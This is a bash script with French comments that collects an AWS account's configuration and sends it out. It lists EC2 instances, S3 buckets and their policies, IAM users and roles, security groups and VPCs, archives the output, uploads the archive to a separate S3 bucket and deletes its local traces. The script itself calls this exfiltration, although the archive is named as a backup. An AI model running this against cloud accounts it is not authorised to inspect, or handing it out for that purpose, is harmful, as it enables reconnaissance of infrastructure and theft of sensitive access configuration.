#!/bin/bash

# Configuration
OUTPUT_DIR="/tmp/aws-config"
S3_BUCKET="your-secure-bucket" # Remplacez par le nom de votre bucket S3 de destination de l'exfiltration
DATE=$(date +'%Y-%m-%d_%H-%M-%S')
ARCHIVE_NAME="aws_config_backup_$DATE.tar.gz"
LOG_FILE="$OUTPUT_DIR/extraction_log.txt"

# Création du répertoire de sortie
echo "Création du répertoire de sortie..."
mkdir -p $OUTPUT_DIR

# Fonction de log
log() {
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" | tee -a $LOG_FILE
}

# Exfiltration des configurations AWS
log "Démarrage de l'exfiltration des données AWS..."

log "Récupération des instances EC2..."
aws ec2 describe-instances > "$OUTPUT_DIR/ec2_instances.json"

log "Récupération des buckets S3..."
aws s3api list-buckets > "$OUTPUT_DIR/s3_buckets.json"

log "Récupération de la politique de chaque bucket S3..."
for bucket in $(aws s3api list-buckets --query "Buckets[].Name" --output text); do
    aws s3api get-bucket-policy --bucket "$bucket" > "$OUTPUT_DIR/${bucket}_policy.json" 2>>$LOG_FILE || log "Pas de politique pour le bucket $bucket"
done

log "Récupération des utilisateurs IAM..."
aws iam list-users > "$OUTPUT_DIR/iam_users.json"

log "Récupération des rôles IAM..."
aws iam list-roles > "$OUTPUT_DIR/iam_roles.json"

log "Récupération des groupes de sécurité dans EC2..."
aws ec2 describe-security-groups > "$OUTPUT_DIR/ec2_security_groups.json"

log "Récupération des configurations VPC..."
aws ec2 describe-vpcs > "$OUTPUT_DIR/vpcs.json"

# Archivage des données exfiltrées
log "Compression des données en un fichier archive..."
tar -czf "$OUTPUT_DIR/$ARCHIVE_NAME" -C "$OUTPUT_DIR" .

# Vérification de l'archive créée
if [ -f "$OUTPUT_DIR/$ARCHIVE_NAME" ]; then
    log "Archive créée avec succès : $ARCHIVE_NAME"
else
    log "Erreur lors de la création de l'archive."
    exit 1
fi

# Envoi de l'archive vers le bucket S3
log "Envoi de l'archive vers le bucket S3 $S3_BUCKET..."
aws s3 cp "$OUTPUT_DIR/$ARCHIVE_NAME" "s3://$S3_BUCKET/" || { log "Échec de l'envoi vers S3"; exit 1; }

log "Vérification de l'envoi vers S3..."
if aws s3 ls "s3://$S3_BUCKET/$ARCHIVE_NAME" > /dev/null; then
    log "Archive envoyée avec succès vers S3."
else
    log "Erreur : l'archive n'est pas présente sur S3."
    exit 1
fi

# Nettoyage des fichiers temporaires
log "Nettoyage des fichiers temporaires..."
rm -rf $OUTPUT_DIR/*.json
rm -f "$OUTPUT_DIR/$ARCHIVE_NAME"

log "Exfiltration terminée avec succès."

exit 0
